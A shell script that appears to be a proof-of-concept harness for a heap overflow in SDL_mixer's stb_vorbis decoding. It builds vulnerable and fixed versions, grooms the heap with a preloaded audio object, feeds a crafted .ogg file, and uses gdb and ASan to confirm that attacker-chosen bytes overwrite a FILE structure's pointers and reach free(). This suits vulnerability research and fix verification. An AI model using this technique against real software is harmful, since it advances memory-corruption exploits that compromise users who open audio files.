#!/bin/sh
# W208: real SDL_mixer consumer, valid-audio preload groom. The public API
# keeps one decoded audio object alive, then loads the 205-byte crafted file.
# gdb watches the attack FILE's live _IO_save_base field receive file-chosen
# bytes and later passed to free(). Fixed and safe controls stay clean.
set -u
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
cd "$HERE" || exit 2
mkdir -p consumer/evidence
printf 'not an ogg file\n' > evidence/safe-input.bin
SDM=../sdlmixer2shell/deps
SDL3DIR=$(CDPATH= cd -- "$SDM/SDL3-3.4.0-build" && pwd)
[ -n "$SDL3DIR" ] || exit 2
INC="-I$SDM/SDL3-3.4.0-build/include -I$SDM/SDL-release-3.2.4/include -I$SDM/SDL_mixer-vuln-src/include"
LIBS="-lSDL3_mixer -lSDL3 -lm -lpthread -ldl"

if [ ! -f consumer/mix-vuln-stb-plain/libSDL3_mixer.a ]; then
    cmake -S "$SDM/SDL_mixer-vuln-src" -B consumer/mix-vuln-stb-plain \
        -DCMAKE_BUILD_TYPE=Debug -DCMAKE_C_FLAGS='-g -O0 -fno-omit-frame-pointer' \
        -DSDL3_DIR="$SDL3DIR" -DSDLMIXER_VORBIS_STB=ON \
        -DSDLMIXER_VORBIS_VORBISFILE=OFF -DSDLMIXER_VORBIS_TREMOR=OFF \
        -DBUILD_SHARED_LIBS=OFF -DDSDLMIXER_TESTS=OFF -DDSDLMIXER_EXAMPLES=OFF \
        > consumer/mix-vuln-plain-config.log 2>&1 || exit 2
    cmake --build consumer/mix-vuln-stb-plain -j4 \
        > consumer/mix-vuln-plain-build.log 2>&1 || exit 2
fi
gcc -g -O0 -fno-omit-frame-pointer -o consumer/mix-stb-vuln-plain \
    consumer/mix-driver.c $INC -L"$SDL3DIR" -Lconsumer/mix-vuln-stb-plain $LIBS || exit 2
export LD_LIBRARY_PATH="$SDL3DIR"
export SDL_AUDIO_DRIVER=dummy

./consumer/mix-stb-vuln-plain evidence/chosen.ogg evidence/preload-safe.ogg \
    > consumer/evidence/preload-attack.out 2>&1
ATTACK_RC=$?
./consumer/mix-stb-vuln-plain evidence/safe-input.bin evidence/preload-safe.ogg \
    > consumer/evidence/preload-safe.out 2>&1
SAFE_RC=$?

sh run-consumer.sh > consumer/evidence/preload-controls.out 2>&1
CTL_RC=$?
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 \
    ./consumer/mix-stb-fixed evidence/chosen.ogg evidence/preload-safe.ogg \
    > consumer/evidence/preload-fixed.out 2>&1
FIXED_RC=$?
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 \
    ./consumer/mix-stb-vuln evidence/chosen.ogg evidence/preload-safe.ogg \
    > consumer/evidence/preload-asan.out 2>&1
ASAN_RC=$?

gdb -batch -ex 'unset env LINES' -ex 'unset env COLUMNS' \
    -ex 'set args evidence/chosen.ogg evidence/preload-safe.ogg' \
    -x consumer/preload-break.gdb ./consumer/mix-stb-vuln-plain \
    > consumer/evidence/preload-gdb.out 2>&1
GDB_RC=$?

printf 'attack_rc=%s safe_rc=%s fixed_rc=%s asan_rc=%s controls_rc=%s gdb_rc=%s\n' \
    "$ATTACK_RC" "$SAFE_RC" "$FIXED_RC" "$ASAN_RC" "$CTL_RC" "$GDB_RC"
PASS=0; FAIL=0
check() {
    if grep -qF "$2" "$3"; then
        PASS=$((PASS+1)); echo "PASS $1"
    else
        FAIL=$((FAIL+1)); echo "FAIL $1 expected: $2"
    fi
}
[ "$ATTACK_RC" -eq 139 ] && { PASS=$((PASS+1)); echo 'PASS attack_segv rc=139'; } || { FAIL=$((FAIL+1)); echo "FAIL attack_segv rc=$ATTACK_RC"; }
[ "$SAFE_RC" -eq 0 ] && { PASS=$((PASS+1)); echo 'PASS safe_clean rc=0'; } || { FAIL=$((FAIL+1)); echo "FAIL safe_clean rc=$SAFE_RC"; }
[ "$FIXED_RC" -eq 0 ] && { PASS=$((PASS+1)); echo 'PASS fixed_clean rc=0'; } || { FAIL=$((FAIL+1)); echo "FAIL fixed_clean rc=$FIXED_RC"; }
[ "$CTL_RC" -eq 0 ] && { PASS=$((PASS+1)); echo 'PASS asan_controls rc=0'; } || { FAIL=$((FAIL+1)); echo "FAIL asan_controls rc=$CTL_RC"; }
[ "$GDB_RC" -eq 0 ] && { PASS=$((PASS+1)); echo 'PASS gdb_rc=0'; } || { FAIL=$((FAIL+1)); echo "FAIL gdb_rc=$GDB_RC"; }
[ "$ASAN_RC" -ne 0 ] && { PASS=$((PASS+1)); echo "PASS asan_attack rc=$ASAN_RC"; } || { FAIL=$((FAIL+1)); echo 'FAIL asan_attack rc=0'; }
check asan_overflow 'ERROR: AddressSanitizer: heap-buffer-overflow' consumer/evidence/preload-asan.out
check asan_write 'WRITE of size 4' consumer/evidence/preload-asan.out
check asan_preload 'MIX_PRELOAD=' consumer/evidence/preload-asan.out
check preload_real_api 'MIX_PRELOAD=' consumer/evidence/preload-attack.out
check live_file_delta 'W208_PRE' consumer/evidence/preload-gdb.out
check store_low 'W208_STORE_LOW' consumer/evidence/preload-gdb.out
check store_high 'W208_STORE_HIGH' consumer/evidence/preload-gdb.out
check post_pointer 'W208_POST' consumer/evidence/preload-gdb.out
check chosen_free '__GI___libc_free (mem=0x4b4341484b434148)' consumer/evidence/preload-gdb.out
check fixed_rejects 'MIX_LoadAudio_IO=(nil)' consumer/evidence/preload-fixed.out

python3 - <<'PY' || exit 2
import re, sys
from pathlib import Path
text = Path('consumer/evidence/preload-gdb.out').read_text()
checks = [
    (r'W208_PRE mult=(0x[0-9a-f]+) file=(0x[0-9a-f]+) delta=32', 'live FILE at +32'),
    (r'W208_STORE_LOW .*j=0 k=26 save_base=0x4b434148', 'low pointer half at k=26'),
    (r'W208_STORE_HIGH .*j=0 k=27 save_base=0x4b4341484b434148', 'high pointer half at k=27'),
    (r'W208_POST .*save_base=0x4b4341484b434148 backup_base=0x4b4341484b434148 save_end=0x4b4341484b434148', 'three live FILE pointers'),
    (r'__GI___libc_free \(mem=0x4b4341484b434148\)', 'chosen pointer reaches free'),
]
failed = 0
for pattern, label in checks:
    if re.search(pattern, text):
        print('PASS', label)
    else:
        print('FAIL', label)
        failed += 1
sys.exit(bool(failed))
PY
PY_RC=$?
if [ "$PY_RC" -eq 0 ]; then PASS=$((PASS+1)); else FAIL=$((FAIL+1)); fi
echo "TOTAL PASS=$PASS FAIL=$FAIL"
grep -E 'W208_PRE|W208_STORE_LOW|W208_STORE_HIGH|W208_POST|__GI___libc_free' consumer/evidence/preload-gdb.out
[ "$FAIL" -eq 0 ]
